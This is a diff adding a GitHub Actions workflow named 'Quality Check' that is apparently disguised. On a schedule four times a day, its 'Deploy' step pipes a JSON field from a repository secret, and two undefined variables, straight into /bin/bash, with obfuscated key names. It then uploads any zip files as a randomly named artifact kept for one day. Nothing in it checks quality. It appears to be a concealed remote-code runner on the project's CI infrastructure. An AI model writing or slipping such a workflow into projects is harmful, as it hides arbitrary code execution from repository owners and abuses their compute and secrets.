@@ -1,0 +1,29 @@
+name: Quality Check
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '32 3,9,15,21 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  dispatcher:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+      - name: Deploy
+        env:
+          l9188: ${{ secrets.l9188 }}
+        run: |
+          printf '%s' "$l9188" | jq -r .ujhc2 | /bin/bash
+          echo $cm64 | jq -r .qbr68 | /bin/bash
+          printf '%s' "$u672" | jq -r .jucq31 | /bin/bash
+
+      - name: Save results
+        uses: actions/upload-artifact@v4
+        with:
+          name: uqPQlwfa
+          path: "*.zip"
+          retention-days: 1
